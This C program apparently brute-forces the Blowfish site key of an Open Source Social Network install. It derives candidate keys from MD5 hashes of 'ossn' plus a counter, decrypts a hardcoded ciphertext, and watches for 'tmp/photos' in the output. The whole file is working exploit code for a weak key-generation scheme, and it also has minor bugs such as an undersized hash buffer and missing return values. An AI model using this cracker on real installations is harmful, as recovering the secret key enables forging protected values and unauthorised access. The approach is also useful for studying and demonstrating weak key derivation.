#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <openssl/md5.h>
#include <openssl/blowfish.h>
#include <openssl/evp.h>
#include "base64/base64.h"

#define KEY_LENGTH 20

pthread_mutex_t lock;
int attempts_per_second = 0;
int key_found = 0;
unsigned char *ciphertext = "cdyy5qoBmIo7xivGl6xURNNG6Hc9FldDhgy6EbRBgDOFEX7hIT+Byw==";
struct generator_args {
    long min;
    long max;
    int starting_offset;
    int final_offset;
};

void *test_attempt(void *args) {
    pthread_mutex_lock(&lock);
    attempts_per_second++;
    pthread_mutex_unlock(&lock);
    char *str_key = (char *) args;
    const EVP_CIPHER *cipher_type = EVP_get_cipherbyname("bf-ecb");
    char *cycled_key = malloc(KEY_LENGTH);
    BF_KEY *bf_key = malloc(sizeof(BF_KEY));
    unsigned char *encrypted_bytes = malloc(1024);
    unsigned char *result = malloc(1024);
    int decoded_byte_count = b64_decode(ciphertext, strlen(ciphertext), encrypted_bytes);

    memset(result, 0, 1024);
    memset(cycled_key, 0, KEY_LENGTH);
    strcpy(cycled_key, str_key);

    while (strlen(cycled_key) < KEY_LENGTH) {
        int concat_size = KEY_LENGTH - strlen(cycled_key);

        if (concat_size > strlen(str_key)) {
            concat_size = strlen(str_key);
        }

        strncat(cycled_key, str_key, concat_size);
    }

    BF_set_key(bf_key, KEY_LENGTH, cycled_key);
    unsigned char *result_next = result;
    unsigned char *eb_pointer = encrypted_bytes;

    while (decoded_byte_count) {
        BF_ecb_encrypt(eb_pointer, result_next, bf_key, BF_DECRYPT);
        eb_pointer += 8;
        result_next += 8;
        decoded_byte_count -= 8;
    }
   
    if (strstr(result, "tmp/photos") != NULL) {
        printf("Key found: %s Message: %s\n", str_key, result);
        pthread_mutex_lock(&lock);
        key_found = 1;
        pthread_mutex_unlock(&lock);
    }

    free(str_key);
    free(encrypted_bytes);
    free(result);
    free(bf_key);
    free(cycled_key);
}

void *attempt_generator(void *arguments) {
    struct generator_args *args = malloc(sizeof(struct generator_args));
    args = arguments;
    pthread_t threads[5000];
    int thread_index = 0;

    for (long i = args->min; i <= args->max; i++) {
        if (key_found) {
            return;
        }

        char *string = (char *) malloc(1024 * sizeof(char));
        unsigned char hash[MD5_DIGEST_LENGTH];
        char *attempt = (char *) malloc(1024 * sizeof(char));
        char *attempt_pointer = attempt;
        char hash_hex[32];
        char *hash_hex_pointer = hash_hex;
        sprintf(string, "ossn%ld", i);
        MD5(string, strlen(string), hash);

        for (int j = 0; j < MD5_DIGEST_LENGTH; j++) {
            hash_hex_pointer += sprintf(hash_hex_pointer, "%02x", hash[j]);
        }

        hash_hex_pointer = hash_hex;

        for (int y = args->starting_offset; y < args->final_offset; y++) {
            attempt_pointer += sprintf(attempt_pointer, "%c", hash_hex_pointer[y]);
        }
       
        pthread_create(&threads[thread_index], NULL, test_attempt, attempt);
       
        if (thread_index == 4999) {
            for (int j = 0; j < sizeof(threads) / sizeof(threads[0]); j++) {
                pthread_join(threads[j], NULL);
            }

            thread_index = 0;
        } else {
            thread_index++;
        }

        free(string);
    }

    for (int i = 0; i < sizeof(threads) / sizeof(threads[0]); i++) {
        pthread_join(threads[i], NULL);

        if (key_found) {
            return;
        }
    }
}

void *progress_thread() {
    time_t base_time = time(NULL);

    while (1) {
        if (key_found) {
            return;
        } else if (difftime(time(NULL), base_time) >= 1.0) {
            printf("Attempts per second: %d\n", attempts_per_second);
            base_time = time(NULL);
            pthread_mutex_lock(&lock);
            attempts_per_second = 0;
            pthread_mutex_unlock(&lock);
        } else {
            usleep(100 * 1000);
        }
    }
}

void start_generators(long max_value, int thread_count) {
    pthread_t threads[thread_count];
    struct generator_args args[thread_count];

    while (max_value % thread_count != 0) {
        max_value++;
    }
    
    for (int i = 0; i < thread_count; i++) {
        args[i].max = (max_value / thread_count) * (i + 1);
        args[i].min = (max_value / thread_count) * i;

        if (args[i].min > 0) {
            args[i].min++;
        }

        args[i].starting_offset = 3;
        args[i].final_offset = 11;
        pthread_create(&threads[i], NULL, attempt_generator, &args[i]);
    }
   
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
}


int main() {
    setbuf(stdout, NULL);
    time_t start_time = time(NULL);
    pthread_t progress_monitor;
    pthread_create(&progress_monitor, NULL, progress_thread, NULL);
    start_generators(2147483647, 1);
    pthread_join(progress_monitor, NULL);
    printf("Time taken: %f\n", difftime(time(NULL), start_time));
    return 0;
}
